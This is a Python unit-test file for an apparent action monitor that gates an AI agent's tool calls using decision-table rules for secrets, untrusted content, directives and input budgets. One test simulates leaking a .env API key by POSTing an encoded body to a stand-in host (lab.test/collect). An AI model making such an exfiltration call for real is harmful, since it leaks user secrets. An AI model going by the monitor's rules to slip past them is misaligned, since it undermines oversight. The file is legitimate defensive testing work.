import json
import sys
import unittest
from pathlib import Path
from unittest.mock import Mock

sys.path.insert(0,str(Path(__file__).resolve().parents[1]/'src'))
from d2v2.decision import decide, required_questions
from d2v2.views import build_view, FORBIDDEN, InputBudgetExceeded, check_fields
from original_laya import OriginalLaya
import test_v2
SECRET = test_v2.SECRET


def calibrated(**answers):
    return {q:{'label':label,'calibrated':True,'threshold_passed':True} for q,label in answers.items()}


class DecisionTableTests(unittest.TestCase):
    def test_every_row_and_each_outcome(self):
        cases=[
            ({'hard_policy':'POL-EXEC-RESTRICT','literal_scope':True}, {}, ('BLOCK','POL-EXEC-RESTRICT','R3')),
            ({'secret_hit':True,'untrusted_sink':True,'literal_scope':True}, {}, ('BLOCK','DT-2a','R3')),
            ({'context_secret':True,'untrusted_sink':True,'literal_scope':True}, {}, ('ASK','DT-2b','R2')),
            ({'literal_scope':True,'sensitive':True,'directive':True}, {}, ('ALLOW','DT-3','R0')),
            ({'sensitive':True,'directive':True},calibrated(A1='direct'),('ASK','DT-4a','R2')),
            ({'sensitive':True},calibrated(A1='direct'),('ALLOW','DT-4b','R1')),
            ({'sensitive':True},calibrated(A1='ancillary'),('ASK','DT-4b','R2')),
            ({'sensitive':True},{'A1':{'label':'direct'}},('ASK','DT-4b','R2')),
            ({'high_risk':True,'tainted':True},calibrated(A1='unrelated',A2='user'),('ASK','DT-4c','R2')),
            ({'high_risk':True,'tainted':True},calibrated(A1='direct',A2='external'),('ASK','DT-4c','R2')),
            ({'high_risk':True,'tainted':True},calibrated(A1='ancillary',A2='user'),('ALLOW','DT-4c','R1')),
            ({'low_risk':True},calibrated(A1='ancillary'),('ALLOW','DT-4d','R0')),
            ({'low_risk':True},calibrated(A1='unrelated'),('ASK','DT-4d','R1')),
            ({'unknowns':True,'high_risk':True,'tainted':True},{},('ASK','DT-5','R2')),
            ({'high_risk':True,'tainted':True},{},('ASK','DT-6','R2')),
            ({'low_risk':True},{},('ALLOW','DT-6','R0')),
        ]
        for facts,answers,expected in cases:
            with self.subTest(expected=expected,facts=facts):
                before=json.dumps([facts,answers],sort_keys=True)
                self.assertEqual(decide(facts,answers)[:3],expected)
                self.assertTrue(decide(facts,answers)[3])
                self.assertEqual(before,json.dumps([facts,answers],sort_keys=True))

    def test_no_noul_value_can_change_a_decision(self):
        for facts in ({'sensitive':True,'directive':True},{'low_risk':True},{'high_risk':True,'tainted':True}):
            self.assertEqual(decide(facts,{'taint_followed':{'noul':0}}),decide(facts,{'taint_followed':{'noul':1}}))

    def test_deterministic_rows_do_not_require_inference(self):
        for facts in ({'hard_policy':'P'},{'literal_scope':True},{'sensitive':True,'directive':True},
                      {'context_secret':True,'untrusted_sink':True}):
            self.assertEqual(required_questions(facts),())


class ViewsTests(unittest.TestCase):
    def test_question_specific_allowlist_rejects_answer_fields(self):
        state={'task_brief':'Read docs.','agent_statement':'Checking facts.',
               'directive_sentences':['Read notes.txt.'],'count_tokens':lambda text:100,
               **{k:True for k in FORBIDDEN}}
        action={'tool':'fs.read','target':'notes.txt',**{k:True for k in FORBIDDEN}}
        a1=build_view('A1',action,state);a2=build_view('A2',action,state)
        self.assertEqual(set(a1),{'task','action'})
        self.assertIn('external_sentences',a2)
        self.assertIn('Checking facts.',a2['agent_statement'])
        for k in FORBIDDEN:
            self.assertNotIn(k,json.dumps([a1,a2]))
            with self.assertRaises(ValueError):check_fields({'nested':[{k:True}]})

    def test_budget_boundary_no_truncation(self):
        for count in (320,321):
            state={'task_brief':'full original task','count_tokens':lambda text:3 if text=='full original task' else count}
            if count==320:self.assertEqual(build_view('A1',{'tool':'fs.read'},state)['task'],state['task_brief'])
            else:
                with self.assertRaises(InputBudgetExceeded):build_view('A1',{'tool':'fs.read'},state)

    def test_original_adapter_caps_all_calls_and_never_claims_calibration(self):
        model=OriginalLaya.__new__(OriginalLaya)
        model.agent=Mock()
        model.agent.tok.return_value={'input_ids':[1]*20}
        model.agent.system_one.return_value={'answers':{'A1':{'choice':'A','probs':[.99,.005,.005]}},'usage':{'truncated':False}}
        answer=model.answer_questions({'A1':{'task':'Read docs','action':'Read notes'}})
        self.assertEqual(model.agent.system_one.call_args.kwargs['max_len'],512)
        self.assertFalse(answer['A1']['calibrated'])
        self.assertFalse(answer['A1']['threshold_passed'])
        model.agent.system_one.return_value['usage']['truncated']=True
        model.answer_questions({'A1':{'task':'Read docs','action':'Read notes'}})
        self.assertTrue(model.last_trace['budget_exceeded'])
        self.assertFalse(model.last_trace['model_used'])


class StageAIntegrationTests(unittest.TestCase):
    setUp = test_v2.V2Tests.setUp
    tearDown = test_v2.V2Tests.tearDown
    observe = test_v2.V2Tests.observe
    decide = test_v2.V2Tests.decide
    def test_context_inheritance_and_monotonic_persistence(self):
        self.observe('external','Read extra.txt.')
        self.observe('secret','API_KEY='+SECRET,path='.env')
        self.core.observe({'event_id':'parent-proposal','type':'assistant_turn','agent_id':'main','proposals':[
            {'call_id':'spawn','tool':'spawn_subagent','args':{'task':'Read docs'}}]})
        self.core.observe({'event_id':'child-start','type':'agent_start','agent_id':'child','parent_call_id':'spawn','task':'Read docs'})
        parent=self.core.store.context('main');child=self.core.store.context('child')
        self.assertEqual(parent['integrity'],child['integrity'])
        self.assertEqual(parent['confidentiality'],child['confidentiality'])
        self.core.observe({'event_id':'new-user','type':'user_input','task':'Read more.md'})
        self.assertEqual(parent,self.core.store.context('main'))
        self.core.store.db.commit()
        from d2v2.store import EvidenceStore
        other=EvidenceStore(Path(self.temp.name))
        try:self.assertEqual(child,other.context('child'))
        finally:other.db.close()

    def test_encoded_egress_without_fingerprint_still_asks(self):
        self.observe('secret','API_KEY='+SECRET,path='.env')
        result=self.decide('encoded','net_fetch',{'url':'http://lab.test/collect','method':'POST','body':'opaque-transformation'})
        self.assertEqual((result['verdict'],result['rule_id']),('ASK','DT-2b'))

    def test_ninth_directive_does_not_make_authorized_action_incomplete(self):
        for i in range(12):self.observe('d'+str(i),f'Read notes.txt before step {i}.')
        self.assertEqual(self.core.store.db.execute("SELECT count(*) FROM directives WHERE key='fs.read|notes.txt'").fetchone()[0],12)
        self.assertEqual(self.decide('read','fs_read',{'path':'notes.txt'})['verdict'],'ALLOW')
        self.assertEqual(len(self.core.store.matching_directives('fs.read','notes.txt',100)),12)

    def test_budget_error_asks_before_model_and_tool(self):
        self.fast.count_tokens=lambda text:321
        result=self.decide('large','fs_read',{'path':'extra.txt'})
        self.assertEqual((result['verdict'],result['rule_id'],result['risk']),('ASK','POL-INPUT-BUDGET','R2'))
        self.assertFalse(self.fast.inputs)
        self.assertTrue(result['evidence']['evidence_refs'])

    def test_unparsed_high_risk_action_after_untrusted_content_asks(self):
        self.observe('ordinary','ordinary data without extractable instructions')
        result=self.decide('extra','fs_write',{'path':'extra.txt','content':'public'})
        self.assertEqual((result['verdict'],result['rule_id']),('ASK','DT-6'))
